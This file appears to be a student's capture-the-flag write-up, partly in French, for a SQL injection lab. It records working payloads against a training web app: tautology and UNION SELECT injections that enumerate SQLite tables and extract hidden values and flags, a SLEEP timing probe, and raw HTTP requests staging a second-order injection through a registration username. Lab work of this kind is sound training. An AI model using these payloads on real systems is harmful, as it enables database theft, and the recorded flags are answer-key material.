@@ -1,0 +1,98 @@
+0-vuln.txt
+http://10.42.225.80/api/a3/sql_injection/all_orders?status=paid' OR '1'='1
+La requête fonctionne normalement, c'est dans le champs status qui est injectable.
+
+1-flag.txt
+http://10.42.225.80/api/a3/sql_injection/all_orders?status=no' UNION SELECT NULL,version(),NULL,NULL,NULL;--
+SQLite - FLAG: e68f996dd191f18bfbb466dd38af78f5
+
+En SQLite les tables sont représenté la variable 'name' et les colonnes par la variable 'sql'.
+
+http://10.42.225.80/api/a3/sql_injection/all_orders?status=no' UNION SELECT NULL,NULL,NULL,NULL,name FROM sqlite_master;--
+    [null,null,null,null,"Orders"],
+	[null,null,null,null,"RandomTable1"],
+	[null,null,null,null,"RandomTable10"],
+	[null,null,null,null,"RandomTable2"],
+    [null,null,null,null,"RandomTable3"],
+	[null,null,null,null,"RandomTable4"],
+	[null,null,null,null,"RandomTable5"],
+	[null,null,null,null,"RandomTable6"],
+	[null,null,null,null,"RandomTable7"],
+	[null,null,null,null,"RandomTable8"],
+	[null,null,null,null,"RandomTable9"],
+	[null,null,null,null,"Users"],
+	[null,null,null,null,"not_me"],
+	[null,null,null,null,"sqlite_autoindex_Users_1"]
+
+
+
+http://10.42.225.80/api/a3/sql_injection/all_orders?status=no' UNION SELECT NULL,NULL,NULL,NULL,sql FROM  sqlite_master WHERE name='not_me';--
+    [ null, null, null, null, "CREATE TABLE not_me (\n id INTEGER,\n value TEXT,\n name TEXT\n)" ]
+
+http://10.42.225.80/api/a3/sql_injection/all_orders?status=no' UNION SELECT NULL,NULL,NULL,NULL,value FROM  not_me;--
+    [ null, null, null, null, "42061dc6dbfb4cb26754656bf5e90ba3" ]
+
+
+http://10.42.225.80/api/a3/sql_injection/all_orders?status=no' UNION SELECT NULL,NULL,NULL,SLEEP(5),NULL;--
+    [ 1, "ebd3461f7c450d2efdfe088fc013a07f", "Paid", "TIMOUT FLAG", "FLAG@web0x01.hbtn" ]
+
+-------------------------------------------
+POST /api/a3/sql_injection/second_order/register HTTP/1.1
+
+Host: web0x01.hbtn
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://web0x01.hbtn/a3/sql_injection/second_order/register
+
+content-type: application/json
+
+Content-Length: 64
+
+Origin: http://web0x01.hbtn
+
+Connection: close
+
+Cookie: session=SWdaNM-sTrVJHjyzEw_BGPBP6YYpWjcqjc48U7BQVS0.TLto51DtEKedgNC6JCyr1uQ0JHo
+
+
+
+{"username":"John7'",
+
+"name": "Doe7",
+
+"password":"motdepasse"}
+------------------------------
+POST /api/a3/sql_injection/second_order/login HTTP/1.1
+
+Host: web0x01.hbtn
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://web0x01.hbtn/a3/sql_injection/second_order/login
+
+content-type: application/json
+
+Content-Length: 44
+
+Origin: http://web0x01.hbtn
+
+Connection: true
+
+Cookie: session=SWdaNM-sTrVJHjyzEw_BGPBP6YYpWjcqjc48U7BQVS0.TLto51DtEKedgNC6JCyr1uQ0JHo
+
+
+
+{"username":"John6","password":"motdepasse"}
